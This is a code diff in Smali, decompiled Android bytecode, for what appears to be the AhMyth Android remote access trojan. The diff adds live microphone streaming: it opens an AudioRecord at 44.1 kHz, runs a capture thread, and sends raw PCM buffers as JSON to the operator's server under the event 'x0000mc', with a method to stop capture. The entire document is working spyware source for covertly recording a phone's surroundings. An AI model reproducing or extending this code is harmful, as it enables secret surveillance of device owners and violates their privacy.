@@ -10,6 +10,14 @@
 
 .field static c:Ljava/util/TimerTask;
 
+.field static d:Landroid/media/AudioRecord;
+
+.field static e:Ljava/lang/Thread;
+
+.field static f:Z
+
+.field static g:I
+
 
 # direct methods
 .method static constructor <clinit>()V
@@ -120,6 +128,23 @@
 .end method
 
 .method public static c(I)V
+    .locals 1
+
+    const/4 v0, -0x1
+
+    if-ne p0, v0, :cond_0
+
+    invoke-static {}, Lahmyth/mine/king/ahmyth/g;->h()V
+
+    return-void
+
+    :cond_0
+    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->i(I)V
+
+    return-void
+.end method
+
+.method private static i(I)V
     .locals 4
 
     invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;
@@ -217,6 +242,162 @@
     const-string v0, "external storage access error"
 
     invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+
+    return-void
+.end method
+
+.method public static d()V
+    .locals 2
+
+    const/4 v0, 0x0
+
+    sput-boolean v0, Lahmyth/mine/king/ahmyth/g;->f:Z
+
+    sget-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;
+
+    if-eqz v0, :cond_0
+
+    :try_start_0
+    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V
+
+    sget-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;
+
+    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V
+
+    const/4 v0, 0x0
+
+    sput-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    :catch_0
+    :cond_0
+    sget-object v0, Lahmyth/mine/king/ahmyth/g;->e:Ljava/lang/Thread;
+
+    if-eqz v0, :cond_1
+
+    :try_start_1
+    invoke-virtual {v0}, Ljava/lang/Thread;->join()V
+    :try_end_1
+    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1
+
+    :catch_1
+    const/4 v0, 0x0
+
+    sput-object v0, Lahmyth/mine/king/ahmyth/g;->e:Ljava/lang/Thread;
+
+    :cond_1
+    return-void
+.end method
+
+.method private static h()V
+    .locals 6
+
+    const/4 v0, 0x1
+
+    sput-boolean v0, Lahmyth/mine/king/ahmyth/g;->f:Z
+
+    const v0, 0xac44
+
+    sput v0, Lahmyth/mine/king/ahmyth/g;->g:I
+
+    sget v0, Lahmyth/mine/king/ahmyth/g;->g:I
+
+    const/16 v1, 0x10
+
+    const/4 v2, 0x2
+
+    invoke-static {v0, v1, v2}, Landroid/media/AudioRecord;->getMinBufferSize(III)I
+
+    move-result v0
+
+    mul-int/lit8 v5, v0, 0x2
+
+    const/4 v1, 0x1
+
+    sget v2, Lahmyth/mine/king/ahmyth/g;->g:I
+
+    const/16 v3, 0x10
+
+    const/4 v4, 0x2
+
+    new-instance v0, Landroid/media/AudioRecord;
+
+    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V
+
+    sput-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;
+
+    invoke-virtual {v0}, Landroid/media/AudioRecord;->startRecording()V
+
+    new-instance v0, Lahmyth/mine/king/ahmyth/g$b;
+
+    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/g$b;-><init>()V
+
+    sput-object v0, Lahmyth/mine/king/ahmyth/g;->e:Ljava/lang/Thread;
+
+    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
+
+    return-void
+.end method
+
+.method static synthetic j([B)V
+    .locals 0
+
+    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->k([B)V
+
+    return-void
+.end method
+
+.method private static k([B)V
+    .locals 5
+
+    :try_start_0
+    new-instance v0, Lorg/json/JSONObject;
+
+    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V
+
+    const-string v1, "pcm"
+
+    const/4 v2, 0x1
+
+    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
+
+    const-string v1, "buffer"
+
+    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+
+    const-string v1, "sampleRate"
+
+    sget v3, Lahmyth/mine/king/ahmyth/g;->g:I
+
+    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;
+
+    invoke-static {}, Lahmyth/mine/king/ahmyth/e;->a()Lahmyth/mine/king/ahmyth/e;
+
+    move-result-object p0
+
+    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/e;->b()Lb/a/b/e;
+
+    move-result-object p0
+
+    const-string v1, "x0000mc"
+
+    new-array v3, v2, [Ljava/lang/Object;
+
+    const/4 v4, 0x0
+
+    aput-object v0, v3, v4
+
+    invoke-virtual {p0, v1, v3}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
+    :try_end_0
+    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0
+
+    return-void
+
+    :catch_0
+    move-exception p0
+
+    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V
 
     return-void
 .end method
